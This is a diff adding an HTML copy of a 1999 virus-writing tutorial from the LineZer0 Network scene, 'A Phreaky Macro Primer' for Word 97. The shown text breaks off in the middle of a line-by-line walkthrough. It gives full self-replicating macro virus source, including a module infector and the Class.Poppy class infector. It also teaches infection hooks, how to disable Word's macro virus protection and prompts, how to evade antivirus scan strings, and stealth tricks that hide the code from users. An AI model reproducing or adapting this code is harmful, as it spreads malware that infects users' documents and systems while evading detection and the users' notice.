@@ -1,0 +1,1309 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Word 97</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote> 
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Word 97 ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</b>
+
+     .Introduction to Word macros
+     .The 'Word' basics 
+     .Infection hooks for Word
+     .The basic Word module macro 
+     .Infection technics for Word
+     .Stealth technics for Word
+     .The basic Word class macro
+     .Class macro advanced technics
+                               
+   [ Music ]
+ 
+     .Life of agony .The river runs red 
+     .Life of agony .Ugly
+     .Ryker's .Payback time
+     .The Matrix .Soundtrack
+     .Nailbomb .Point Black
+
+
+<b>.Introduction to Word macros</b>
+
+    Finally we start here...hehe...well what can I say? Word macros are the
+most common sort of macros. You need to know that Word has a template where
+you can store your personal setting, etc.  and of course your macros.  This
+template gives you some kind of resistance in Word.  So if your macro is in
+the active document, for infection it first checks if it is not already in-
+stalled in the  template and infects it.  If  it is already in the template
+nothing  will happen.  If the template  carries our  macro it checks if the
+document is  already infected  and if not  it infects it.  This is the main
+activity of a macro bug. Of course there can also be a payload or whatever,
+but more on this later.
+
+    In Word you have much more control over the program as in any other one
+of the Office package.  You can change complete menu function,  for example
+to show a message  box when you open a document or whatever.  Nearly every-
+thing is possible in Word. You have also complete access to the registry!!!
+
+    Ok, before we go to the next chapter, start Word and press 'ALT + F11'.
+You are now in the Editor of Word.  Excel and PowerPoint have the same one.
+Top left you will see the project explorer, if not press 'CTRL + R' to open
+it. Now you see two things in: First the 'Normal'-project and the 'Project'
+-project.  Doubleclick on the second one  to open the tree of the VBProject
+of the document.  You see now 'Microsoft Word Objects'.  There is the class
+stored that comes  with every Word document.  In this class object nowadays
+all macros are coded,  but first we start with the  basics so now to  add a
+module now,  right click on 'Project' - project and 'Insert -&gt; Module'. Now
+we have a module added!  Bwaha,  let us start with some coding for you!  If
+you have coded VB before go to the next chapter, else read on.
+
+    Double click on the new added module. Place the cursor in the big right
+window. Now type in:
+
+	Sub MyFirstVBAProcedure()
+	
+		Msgbox "Heya, you are coding VBA!"
+
+	End Sub
+
+    Place the cursor within the procedure and press 'F5'. This command will
+start the debugger. Take  look at this nice message box and play a bit with
+that and take a look on the syntax. Next we will do another example:
+
+	Sub MySecondVBAProcedure()
+
+		With Assistant.NewBalloon
+		    .Icon = msoIconAlert
+		    .Animation = msoAnimationGetArtsy
+		    .Heading = "Attention!"
+		    .Text = "Today I turn into a martian!"
+		    .Show
+		End With
+
+	End Sub
+
+     This little  procedure will  show you the nice assistant of Office. Ok
+play a bit with this two procedures and then continue with our guide!
+
+
+<b>.The 'Word' basics</b>
+
+    Phew .. you finally reached the basics...well kewl that you are reading
+now this  here.  Let's  start.  First install  the Word help  file for VBA,
+because it will be a good reference for you. It contains a lot of examples.
+If you are not sure about a command, place the cursor on it and press 'F1'.
+This will start the  help for this command.  Ok some of the basic  commands
+are:
+
+
+	On Error Resume Next
+
+    This  command takes care about  all errors that could  happen while our
+macro is executed.  If an error happens,  VBA will try to  execute the next
+command in our macro. 
+
+
+	Options.VirusProtection = False
+
+   Have you ever opened a document which contains a macro? Did you see this
+dialog box which asks you if you want to activate the macros?  This command
+turns this dialog box off. We need this command that our macro does not get
+the  attention of the victim  and that he does  not realize  that  all  his
+documents are infected with your macro bug. So this command is really basic
+every macro virus use it. The next command is also a very very common one.
+
+
+	Options.SaveNormalPrompt = False
+
+   As you already heard there is a template in word which we want to infect
+and for that we change the  template so it needed to be saved.  If the user
+now closes Word after our  macro has infected him,  Word asks him to prompt
+the changes in the template.  'Normal' users won't  think about a virus but
+it is better to avoid as much as unnormal actions in Word.  So this command
+turns off the prompting.  If the user exits Word the template will be saved
+without prompting, otherwise Word would ask.
+
+
+	Application.EnableCancelKey =  wdCancelDisabled
+
+     First you have to know that you can stop the execution of any macro by
+pressing ESC. So if the user does this, our macro will show errors and that
+is not good. Use this little command to disable the ESC key. So there is no
+bypass key anymore until you deactivate this option again.
+
+
+	Application.DisplayAlerts = wdAlertsNone
+
+  This command turns off any alerts. If something not common happens really
+nothing will happen. This command will be active until you deactivate it.
+
+
+	Application.DisplayStatusBar = False
+
+    While you are coding and coding  you will always see that the statusbar
+in Word shows what you do,  like when you save the document after infection
+the statusbar will show the saving process. To avoid it, we make the status
+bar invisible. So our macro won't get the users attention.
+
+
+      Application.ScreenUpdating = False
+
+    This command will disable the screen updating and speed up our macro.
+
+
+    All commands you see here  have one purpose,  to avoid to get the close
+attention of the  user.  What's the use  when your  macro gets  immediately
+detected by the user? Damn, nothing will happen.  This commands help you to
+spread and increase lifetime of your virus. All this commands are also used
+in nearly every macro,  so if you look at  source codes you  will find this
+commands. There is only one problem for you. This commands are scan strings
+for virus scanner so you have  to use kind of anti heuristics which will be
+explained later.  If you don't know what  scan strings are  here is a short
+description:  Virus scanners,  especially for macro,  search the macro code
+for common virus commands like the ones above.  If the scanner finds two or
+more it detects your macro as a virus,  but there are a  few tricks to fool
+the scanners. ;)
+
+    Here is now a little simple graphic to explain you the way of a macro.
+
+  .------------.       .------------.
+  |  Document  |       |  Template  |       A  document  infected  with our
+  .------------.  ---&gt; `------------´       macro and a  'clean'  template.
+  |   Macro    |                            Now  the  macro  stored  in the
+  `------------´                            document  trys  to  infect  the
+                                            template.  First  it  checks if
+                                            it is already  installed if not
+                                            install!
+
+  .------------.        .-----------.
+  |  Document  |        |  Template |       Our macro infected document has
+  .------------.  ---&gt;  .-----------.       now infected the template. Both
+  |   Macro    |        |   Macro   |       contain now the virulant macro.
+  `------------´        `-----------´       
+
+
+   The same what you see here will happen if the template infects a 'clean'
+document but in the other way round. Just exchange the names in the graphic
+or do your own...;) j/k.
+
+
+<b>.Infection hooks for Word</b>
+
+    What the hell are infection hooks?  Infection hooks  are the thing that
+make your macro execute  when the hook gets active.  In Word there are five
+important hooks for module  and two special for class  but to this two more
+later.  This hooks are triggers.  The code stored in  this hook gets active
+when some special action happens.  This can be opening, closing a file, add
+a new file, starting of Word and closing of Word.  Here are the five common
+hooks:
+
+
+	Sub AutoOpen()
+	Sub AutoClose()
+	Sub AutoNew()
+	Sub AutoExec()*
+	Sub AutoExit()*
+
+	* This ones are used especially for the template
+
+
+ -Sub AutoOpen()-
+
+   Like the name says the code will be executed when the document is opened
+or in template you open a document.  If the document is infected it trys to
+infect the template while opening  and if the template  is infected it trys
+to infect the opened document.  Maybe a bit confusing  but you will  get in
+real soon.
+
+ -Sub AutoClose()-
+
+    It the same as AutoOpen but while closing. The code will be executed if
+you close a file.
+
+ -Sub AutoNew()-
+
+    If a template is infected it will try  to infect also all new documents
+you create.
+
+ -Sub AutoExec() & Sub AutoExit()-
+
+    This two are only used for the template. The first one gets active when
+Word is started and the second one you exit Word. The best use this two for
+payloads or whatever.
+
+
+	Private Sub Document_Open()
+	Private Sub Document_Close()
+	
+    This two are used for class infectors but more to them later.
+
+    If you did  understand everything  until here,  I hope so,  we will now
+start with our first macro bug!
+
+
+<b>.The basic Word module macro</b>
+
+    Heja, the time has arrived, finally a working macro .. hehe. First here
+is the complete source code,  after that I walk  through the whole code and
+explain every command. Have phun!
+
+---[ code starts here ]----------------------------------------------------
+
+Sub AutoClose()
+
+On Error Resume Next
+
+Application.DisplayAlerts = wdAlertsNone
+Application.EnableCancelKey = wdCancelDisabled
+Application.DisplayStatusBar = False
+Options.VirusProtection = False
+Options.SaveNormalPrompt = False
+
+Set Doc = ActiveDocument.VBProject.VBComponents
+Set Tmp = NormalTemplate.VBProject.VBComponents
+
+Const ExportSource = "c:\jackie.sys"
+Const VirusName = "AIGTMV"
+
+Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource
+
+For i = 1 To Tmp.Count
+    If Tmp(i).Name = VirusName Then TmpInstalled = 1
+Next i
+
+For j = 1 To Doc.Count
+    If Doc(j).Name = VirusName Then DocInstalled = 1
+Next j
+
+If TmpInstalled = 0 Then
+    Tmp.Import ExportSource
+    NormalTemplate.Save
+End If
+
+If DocInstalled = 0 Then
+    Doc.Import ExportSource
+    ActiveDocument.SaveAs ActiveDocument.FullName
+End If
+
+Msgbox "Word instructional macro by jackie", 0, "Word.APMP"
+
+End Sub
+
+---[ code ends here ]------------------------------------------------------
+
+    If you didn't  understand something  it doesn't matters  because now we
+will walk through every line of code.
+
+---------------------------------------------------------------------------
+Sub AutoClose()
+---------------------------------------------------------------------------
+
+    Every macro starts with a sub,  better called procedure. Like you heard
+before the AutoClose is executed every  time a document gets closed.  So if
+a document is infected with our macro it will try to infect the template if
+you close it.
+
+---------------------------------------------------------------------------
+On Error Resume Next
+---------------------------------------------------------------------------
+
+    If some error happens  try to execute the next one.  It helps us not to
+stuck in code if a command doesn't work.
+
+---------------------------------------------------------------------------
+Application.DisplayAlerts = wdAlertsNone
+Application.EnableCancelKey = wdCancelDisabled
+Application.DisplayStatusBar = False
+Options.VirusProtection = False
+Options.SaveNormalPrompt = False
+---------------------------------------------------------------------------
+
+    Here you see the four basic  commands explained above.  The first turns
+off the display of errors,  the second disables the cancel key,  the thirth
+hides the status bar of Word, fourth turns off virus protection, last turns
+off the prompting of saving  normal template.  This commands  take place in
+99% of macro viruses.
+
+---------------------------------------------------------------------------
+Set Doc = ActiveDocument.VBProject.VBComponents
+Set Tmp = NormalTemplate.VBProject.VBComponents
+---------------------------------------------------------------------------
+
+    Hmm .. the next one is a bit complicated for you  if you are a complete
+newbie in programming. Ok, we need the object 'ActiveDocument.VBProject.VB-
+Components'  often in our macro,  to save code we set this  object into the
+variable  'Doc' . The same for the template.  This object  variables are no
+need!  They are not necessary but if you want to save time and code use it.
+
+---------------------------------------------------------------------------
+Const ExportSource = "c:\jackie.sys"
+Const VirusName = "AIGTMV"
+---------------------------------------------------------------------------
+
+    Here we set two constants  that stay the  same in the whole macro.  The
+first one is the source file for the  export of our virus code.  The second
+one is the name  of the  module that we are using.  We always  stay in this
+module so the name won't change. Short...is the name of the module.
+
+---------------------------------------------------------------------------
+Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource
+---------------------------------------------------------------------------
+
+    This command exports the content of the virus module.  The code will be
+saved in the  file set in the constant  'ExportSource'.  This means for our
+macro that all macro code will be stored in 'c:\jackie.sys'.
+
+---------------------------------------------------------------------------
+For i = 1 To Tmp.Count
+    If Tmp(i).Name = VirusName Then TmpInstalled = 1
+Next i
+---------------------------------------------------------------------------
+
+    This nice little for ... next loop checks if our virus  has already in-
+fected the  normal template.  First make a loop from  one to the  number of
+Visual Basic components in the template.  Compare if the name of the actual
+component is the same as our macros. If yes set the variable 'TmpInstalled'
+true. If not make the next loop.
+
+---------------------------------------------------------------------------
+For j = 1 To Doc.Count
+    If Doc(j).Name = VirusName Then DocInstalled = 1
+Next j
+---------------------------------------------------------------------------
+
+    Like you see this is the same as  above but to check if the document is
+already infected.
+
+---------------------------------------------------------------------------
+If TmpInstalled = 0 Then
+    Tmp.Import ExportSource
+    NormalTemplate.Save
+End If
+---------------------------------------------------------------------------
+
+    If we are not installed in  the normaltemplate  then first  import  our
+virus from  the sourcecode file  'c:\jackie.sys'  then after that save  the
+changes in the template.  This lines will not be executed if we are already
+installed!
+
+---------------------------------------------------------------------------
+If DocInstalled = 0 Then
+    Doc.Import ExportSource
+    ActiveDocument.SaveAs ActiveDocument.FullName
+End If
+---------------------------------------------------------------------------
+
+    Same as the installation for the template but with one change.  We save
+the document as it's full name. So Word won't ask for the name.  If it is a
+new document it will be save as 'Doc1.doc' ex. If it has been already saved
+it will be saved under it's original name.
+
+---------------------------------------------------------------------------
+Msgbox "Word instructional macro by jackie", 0, "Word.APMP"
+---------------------------------------------------------------------------
+
+    Hehe ... this is our little payload.  It just pops up a little box with
+the above contents.
+
+---------------------------------------------------------------------------
+End Sub
+---------------------------------------------------------------------------
+
+    As you  heard a macro starts with  'Sub .... ()'  and now  it ends with
+'End Sub'. Every sub does this...hehe.
+
+
+    So this is your first macro bug now. This is a very very poor macro, no
+stealth, etc ... only for the purpose of this tutorial ... hehe. Try it and
+play a bit with the code, it is a fully working macro bug!  Like you see it
+is really no big problem to write such little macros.  If you didn't under-
+stood something read it again (hehe) and continue then with the guide.
+
+
+<b>.Infection technics for Word</b>
+
+    In this chapter of our guide we will take a close look on the different
+infection and checking  routines.  It is very important to find always some
+kind of new infection technics because  the Antivirus scene does not sleep!
+First I will explain the very common import/export method.  There are older
+ones, but the don't work under SR-1 anymore. ( SR-1 was the service release
+of microsoft to stop the macro viruses ).
+
+<b>
+ .Import/Export</b>
+
+This method was the first technic discovered after the release of SR-1. Hmm
+VicodinES was the one who wrote the first SR-1 compatible,  just to mention
+the guy who did the most for macro coding scene.(Hi Mr.Vic, where are you?)
+The concept is,  to export (write) our source code into an external file on
+the hd and then on infection, when we need the source code again, import it
+from this file. See the example code:
+
+ ActiveDocument.VBProject.VBComponents("jackie").Export "c:\jackie.sys"
+
+This command  will save the whole code in the component  'jackie'  into the
+file 'c:\jackie.sys'. Later we use this command to import (read) the source
+code from the file again.
+
+ NormalTemplate.VBProject.VBComponents.Import "c:\jackie.sys"
+
+What you think?  This command  imports our source code.  The VBA enviroment
+will automatically create a module called 'jackie' and import our code then
+in this component.  This method is nearly used in every module macro virus.
+Nowadays there are nearly no module macros anylonger, because nearly every-
+one writes class macros. More on this later.
+
+
+<b> .Add From File</b>
+
+First to the infection  technic which is used by class macros.  This one is
+taken  from  the very first  class object  infector,  written by VicodinES.
+First we export the source code into an external file.
+
+ ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
+
+This command exports the code of the class  object ('ThisDocument') of Word
+into the file 'c:\class.sys'. Notice that
+
+ ActiveDocument.VBProject.VBComponents(1).Export "c:\class.sys"
+
+would have the same result. Also notice that '1' is always the class module
+'ThisDocument'.  Ok we have now the code exported to an external file.  For
+the infection of a class object we  need to import it into the class object
+again. This is done by this command
+
+ NormalTemplate.VBProject.VBComponents(1).CodeModule _
+  .AddFromFile "c:\class.sys"
+
+This command inserts our viral code  into the class  object of the template
+in Word,  but there is a problem  which is solved easily.  When you compare
+the two exported files,  'jackie.sys' and 'class.sys', you will see that in
+the class file Word will add four internal  lines which will be imported on
+infection.  So we need to delete these four lines.  Use this command to cut
+them
+
+ NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1,4
+ 
+This command will delete the first four lines which we don't need. That you
+see what I mean if have here the four lines which will be added to the code
+automatically.
+
+ VERSION 1.0 CLASS
+ BEGIN
+   MultiUse = -1  'True
+ END
+
+We don't need this lines, they will only force an error, so we delete them.
+
+<b>
+.Add From String/Insert Lines</b>
+
+Let's take a look at another  infection technic,  which I use in general in
+my macro bugs. First we save the whole viral code in a variable and then we
+add our code to the template/document through this string variable.  Take a
+look at this command, which saves the whole code from line one to twenty in
+the variable 'OurCode'
+
+ OurCode = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1,20)
+
+Ha, you know what 'ThisDocument' means? Na? Well it refers to the template/
+document, in which the current code is located. So you don't have to choose
+where the code is located,  Word does it for you.  You can also use instead
+
+ OurCode = MacroContainer.VBProject.VBComponents(1).CodeModule.Lines(1,20)
+
+which would have the same effect, MacroContainer is similar to ThisDocument
+just use what you like better. In the bracket after 'Lines' you have to put
+the number of lines you  want to store into the variable.  The first number
+is the line in which we start,  normaly line number one.  The second one is
+how many lines.  So in our case,  the code from line one  until line twenty
+will be saved in variable ' OurCode '. So now we need to add this code into
+our target to infect. Use this command
+
+ NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString OurCode
+
+to add our code to the class object of normal template. Another command and
+the same effect would be
+
+ NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, OurCode
+
+which would insert all the code in the variable in the first line of normal
+template's class object.  Whatever, use the command you like better. If you
+don't understand a thing,  just re-read it and when you will come away from
+theory you will understand it. Now we come to a more or less important part
+of macro bugs, the stealth.
+
+    Well, now we take a look on the methods or technics we can check if our
+macro virus is already present.  First for module infection we can check if
+our module is present.  This can be done with a few commands or routines. I
+will show you here two different for modules. Well the first one we already
+saw in our first macro bug in the last chapter. Use the following code.
+
+ For x = 1 to Normaltemplate.VBProjects.VBComponents.Count
+	If Normaltemplate.VBProject.VBComponents(x).Name = "Virus" Then _
+       NormalInfected = True
+ Next       
+
+    As I explained in chapter 2.4 this piece of code does a for - next loop
+from 1 to the number of Visual Basic components in the template of Word. So
+use 'ActiveDocument' instead of 'Normaltemplate' to check the infection for
+the document. If the name is equal to our name, 'Virus', then set our check
+variable to 'True'.  Continue loop until last component.  Ok, next piece of
+code is a bit smaller but has the same result. Let's see how it is done.
+
+ If Len(Normaltemplate.VBProject.VBComponents("Virus").Name) = 0 Then _
+  NormalInfected = True
+
+    What we do here,  is to check the length of  the viral module  with the
+name 'Virus'. If the length is zero then the component doesn't exist and we
+set our check variable to 'True'. As you may can immagine the code to check
+the document would just contain 'ActiveDocument'. Fine.
+
+    As you see it is easy to check if we are infected, you may find another
+method to check this, but this are the common ones. Well you have to remem-
+ber that you HAVE to find new ones,  because AV community won't sleep!  ;-)
+Ok, now we leave module infection checks alone and go on with class infect-
+ion checking, which you will need later, but explained here.
+
+    First method to check class  infection is to count  the number of lines
+in template or document and see if the number is similar to our viral code.
+This method was used in the first know class macro 'Class.Poppy'.  The code
+to check this would be similar to this.
+
+ If Normaltemplate.VBProject.VBComponents(1).CodeModule _
+ .CountOfLines = 23 Then NormalInfected = True
+
+    For the document, as you already may know ;-) just use 'ActiveDocument'
+instead of 'Normaltemplate'. Another method to check for a previous infect-
+ion is  to make a marker in your code.  In the following example we use the
+string 'Marker' as our infection marker. Here is the code.
+
+ If Normaltemplate.VBProject.VBComponents(1).CodeModule _
+  .Lines(1,1) = "'Virus" Then NormalInfected = True
+
+    Well, here we  check if the first line of  code in the class  module in
+the template of Word is equal to our marker  ' Virus '. If it is we set our
+check variable to 'True'. And of course you can put the marker in every li-
+ne you want,  just change the settings then.  Again exchange the the object
+to check for the document.
+
+<b>
+.Stealth technics for Word
+
+ .Simple Stealth</b>
+
+    Stealth, that on the menu today.  First a little  theory about stealth.
+Like the name says, stealth helps that the user doesn't notice our presence
+We can disable special stealth menus, etc.  There can be very basic, simple
+Stealth, and much more advanced stealh. We will look first on the more easy
+versions of stealth. In Word we can intercept the execution of some actions
+like the activation of the  visual basic editor that we are working in.  So
+if the user presses 'ALT+F11' we can intercept this.  Or we can disable the
+menus in Word, but first a look on simple interception.  If you put these 2
+lines into your code
+
+ Sub ViewVBCode()
+ End Sub
+
+    you will intercept that the visual basic editor is  shown when the user
+wants to take a look at some code. This will be noticed by the user, so you
+can add some kind of error code into it, like
+
+ Sub ViewVBCode()
+  MsgBox "Unexcpected error",16
+ End Sub
+
+    to show  the user a fake  error message.  Just think for your own faked
+error message. The important stealth menus for Word that you need to inter-
+cept, are:
+
+
+	ViewVBCode
+	ViewCode
+	ToolsMacro
+	FileTemplates
+
+
+<b> .ViewVBCode</b>
+
+    This routine is called when the user presses 'ALT+F11' or clicks on the
+menu entries.
+
+<b> .ViewCode</b>
+
+    Has the same function as first one, to disable the visual basic editor.
+This one is executed if the user presses on the little icon on the toolbox.
+
+<b> .ToolsMacro</b>
+
+    The very basic stealth,  this routine is triggered  if the user presses
+'ALT+F8' or clicks on Tools/Macro. In this popup window all macros are dis-
+played,  except the ones in  the class  area.  Class macro have a so called
+build in stealth.
+<b>
+ .FileTemplates</b>
+
+    This routine is started if the user tries to organize the macros in the
+template. Like in ToolsMacro, class macros won't be displayed.
+
+
+    Next we will take a look on how to disable menus. This stealth more im-
+portant for class macros than the interception of menus. In this method, we
+disable the menu items. The command to disable the item 'Macro' in the menu
+'Tools' would be
+
+ CommandBars("Tools").Controls("Macro").Enabled = False
+
+which will disable the menu. To be language independent use
+
+ CommandBars("Tools").Controls(12).Enabled = False
+
+This will  disalbe the twelved  item of the menu tools.  Just find out what
+menu you want to disable. You can also delete the whole menu item with this
+
+ CommandBars("Tools").Controls(12).Delete
+
+The menu is then deleted remember not disabled!
+
+
+    Now a look on more advanced  stealth.  There are a lot  of really great
+stealth concepts,  some are easy but powerful,  some are more  complicated.
+At least the have the same result, to help you to keep your macro unnoticed
+by the infected user.
+
+<b>
+ .Advanced Stealth</b>
+
+    Advanced Stealth,  first I must say that I never thought about advanced
+in my creations,  because I think that a basic stealth is enough and for my
+class viruses,  I never use any kind of stealth except of the build in one.
+So I looked  around some source  codes from different writers,  and I found
+here some  pretty good stealth technics.  I like to thank people  like Lord
+Arz, who is retired from virus scene (We miss you! Good Luck in your doing)
+or F0re, which did some great stealth technics for Word.
+
+    First technic here is by Lord Arz, taken from W97M.Lizard. Theory: This
+macro intercepts the execution of the macro dialog. If the user presses the
+shortcut  'ALT+F8'  or clicks on the menu,  this routine first exports it's
+code  into a temporary file called 'Lizard.bas' into the current directory.
+Then  it deletes it's module  from the template of Word.  After that Lizard
+displays  the Macro dialog and does a loop in code while the dialog is dis-
+played. If the user closes the dialog again, the code will go on. After the
+user closed it, Lizard imports itself again into the template. Then it del-
+etes the temporary source code file.
+
+ Sub ToolsMacro()
+
+  NormalTemplate.VBProject.VBComponents("Lizard").Export "Lizard.bas"
+
+Export the source into the file 'lizard.bas'...
+
+  Application.OrganizerDelete NormalTemplate.FullName, "Lizard", _
+      wdOrganizerObjectProjectItems
+
+Delete 'Lizard' from the macros in the normal template...
+
+  While Dialogs(wdDialogToolsMacro).Display
+  Wend
+
+Show the dialog and wait til it is closed again...
+
+  NormalTemplate.VBProject.VBComponents.Import "Lizard.bas"
+
+Import 'lizard' again...
+
+  Kill "Lizard.bas"
+
+Delete the source of lizard...
+
+ End Sub
+
+    As you see this is a good technic, but may you improve the code that it
+also hides the macros  in the document if it is infected and the user wants
+to see the dialog.  Just think a bit and you will find a way to do it. Just
+change some commands :) Now some code which does also deleting, but not the
+whole module, but it's code. This code was used in W97M/VBS.Bogus published
+in LineZer0 Network Zine #1. There you can take a look on the whole source.
+So, let us take a look at the code.
+
+ Sub ViewVBCode()
+
+ On Error Resume Next
+ NormalTemplate.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167
+
+This command here  deletes the  lines from  the module 'yoz'.  For using in
+class infectors use '1' instead of 'yoz'.
+
+ ActiveDocument.VBProject.VBComponents("yoz").CodeModule.DeleteLines 1, 167
+
+Same as above but this time in the document.
+
+ NormalTemplate.Saved = True
+ ActiveDocument.Saved = True
+
+These two commands are very important for this stealth. They tell Word that
+the doc/temp is already saved.  So when you close it,  it won't ask you for
+saving.
+
+    If you use this technic,  you must hope that  the user will not save it
+after  he looked at the code,  otherwise our code is lost.  May you improve
+the first technic from Lizard that you can use it in your class object,  or
+whatever. Ok, now the kewlest stealth I have ever seen, written by Lord Arz
+and the code was also published in LineZer0 Network Zine #1.  This is a bit
+more advanced. Simple with the biggest effect. When you look at your visual
+basic editor,  you see that the font colour is black,  but what about if we
+set this colour to white? Right the user won't see any code in! As you see,
+there is no option in the editor,  so we have to access direct into windows
+registry.  This is a gewd feature of Word, you can directly access the reg-
+istry!
+
+
+ System.PrivateProfileString("", _
+  "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", _
+  "CodeBackColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"    
+
+Change the colour of code to white when it is selected.
+
+ System.PrivateProfileString("", _
+  "HKEY_CURRENT_USER\Software\Microsoft\VBA\Office", _
+  "CodeForeColors") = "1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1 1"
+
+Change the general colour of the code.
+
+
+    I know that are lots of technics for stealth, but I never found it much
+interessting so if you need stealth,  try to code your own perfect stealth.
+I know that  there is less done in  stealth technics so maybe you will find
+a good stealth technic, just use your immagination. At the end of this part
+I just want to say,  the better your stealth, the longer your creation will
+stay unnoticed. Be inspired by this technics.
+
+<b>
+.The basic Word class macro</b>
+
+    Hi there, are you awake or sleeping?  Hope you are alive! ;)  So before
+you continue with this part,  I recommend you to toy around with the module
+infections first,  to get all  the basics.  Without them you  copy just the
+code here and write a macro.  Kewl,  then you are one of those lamers which
+gave macro  such a bad name,  just hacking other macros.  Try to understand
+the basics then go on, use your immagination and write gewd macros!  If you
+think  it's ok to write lack macros,  then FUCK YOU BURN THIS TUTORIAL!  VX
+scene doesn't need such people,  but if you don't think it's ok to be lame,
+then feel free and read on! You have to understand my reaction,  because if
+you look at  www.avpve.com  into the macro  section you will see that there
+are too much macros by lamers which sended there creation to AVP just to be
+on the AVPVE site, fuck this lamers! Never forget, don't send your creation
+to any AV firm! It's lame.  You don't want to be lame or? So read on to get
+out of this phase.
+
+    Ok, let's come now to the class infection. What is a class object? Easy
+if you take a look at your visual basic editor,  then you will find a thing
+called 'ThisDocument'. This is our class object. Every document or template
+has this class inside, so it should be a kewl idea to infect such an object
+or what you think? Before we start we will do some theory.  First you can't
+have the  same public routines  in class objects.  If you have for example,
+'Sub AutoOpen()' as a hook in the document, then you can't have this one in
+the template.  You have to change it to  'Sub AutoClose()'  or whatever you
+like.  As you see the term 'Sub ... ()' is public. To avoid this changes we
+can use private routines or better say  'Subs' ,  but more on this later in
+advanced class technics.  So now I have here  for you the  very first class
+macro ever, borrowed from VicodinES, thanks! This is the code from the doc!
+
+<b><font color="#FF0000">(NOTE By Cicatrix:&quot;Some of the code below was written in ASCII and 
+does not translate to HTML correctly. Please refer to the LZO #2 
+zine for the correct version)</font></b><font color="#FF0000">
+</font>
+
+---[ code starts here ]----------------------------------------------------
+
+'W97/Class.Poppy.A
+'Word 97 Class Object Infector
+'First Ever Class Object Infetor
+
+Sub AutoOpen()
+ 
+On Error GoTo out
+ 
+Options.VirusProtection = False
+
+Options.SaveNormalPrompt = False
+ 
+Options.ConfirmConversions = False
+
+ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
+ 
+nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
+ 
+If Day(Now) = 31 Then MsgBox "•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•" + _
+Chr$(13) + "•  VicodinES /CB /TNN •" + Chr$(13) + _
+"•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•-•", 0, "This Is Class"
+ 
+If nt = 0 Then
+ 
+    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
+ 
+    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
+ 
+End If
+ 
+If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
+ 
+If nt &gt; 0 And ad &gt; 0 Then GoTo out
+ 
+host.codemodule.AddFromFile ("c:\class.sys")
+ 
+With host.codemodule
+ 
+    For x = 1 To 4
+ 
+    .deletelines 1
+ 
+    Next x
+ 
+End With
+ 
+If nt = 0 Then
+ 
+    With host.codemodule
+ 
+    .replaceline 1, "Sub AutoClose()"
+ 
+    .replaceline 69, "Sub ViewVBCode()"
+    
+    End With
+ 
+End If
+ 
+With host.codemodule
+ 
+    For x = 2 To 70 Step 2
+ 
+    .replaceline x, "'" & Application.UserName & Now & _
+      Application.ActivePrinter & Now
+ 
+    Next x
+
+End With
+ 
+out:
+ 
+If nt &lt;&gt; 0 And ad = 0 Then ActiveDocument.SaveAs ActiveDocument.FullName
+ 
+End Sub
+
+Sub ToolsMacro()
+
+End Sub
+
+---[ code ends here ]------------------------------------------------------
+
+
+    What you see is the first class object infector ever,  it has a message
+as payload  and uses simple stealth.  May you wonder why there is only code
+in every second line?  The answer is simple,  this is used by VSMP which is
+Vic's Simple Macro Poly engine,  but more on this later.  If the code won't
+be in every second line, the virus will crash. I will walk now step by step
+through the whole code.
+
+---------------------------------------------------------------------------
+Sub AutoOpen()
+---------------------------------------------------------------------------
+
+    If you look back in this guide,  you will remember that this routine is
+always executed when a document gets opened.  In our case, Class.Poppy, the
+AutoOpen hook is used in the document code, so every document will have the
+AutoOpen hook and every template the AutoClose hook, but more on this later
+in code.
+
+---------------------------------------------------------------------------
+On Error GoTo out
+---------------------------------------------------------------------------
+
+   This is  the error handler,  if some  error happens,  the code below the
+label 'out' will be executed.
+
+---------------------------------------------------------------------------
+Options.VirusProtection = False
+---------------------------------------------------------------------------
+
+    As I told in the basics,  this command will turn off the virus protect-
+ion of Word on opening an infected document. If you don't remember read the
+basics again.
+
+---------------------------------------------------------------------------
+Options.SaveNormalPrompt = False
+---------------------------------------------------------------------------
+
+    Again something from the basics. As I said, every macro virus uses such
+commands.  This one is used to turn off the prompting for saving changes in
+Normal.dot when closing Word.
+
+---------------------------------------------------------------------------
+Options.ConfirmConversions = False
+---------------------------------------------------------------------------
+
+    This command turns off the prompting for conversions in documents, like
+language, saving format, etc.
+
+---------------------------------------------------------------------------
+ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
+nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
+---------------------------------------------------------------------------
+
+    Save the number of lines in the class object of the active document in-
+to the variable ' ad '.  We need this to check if we are already present in
+the active document.  Same for the number of lines in the template, we just
+save the number into the variable 'nt'.
+
+---------------------------------------------------------------------------
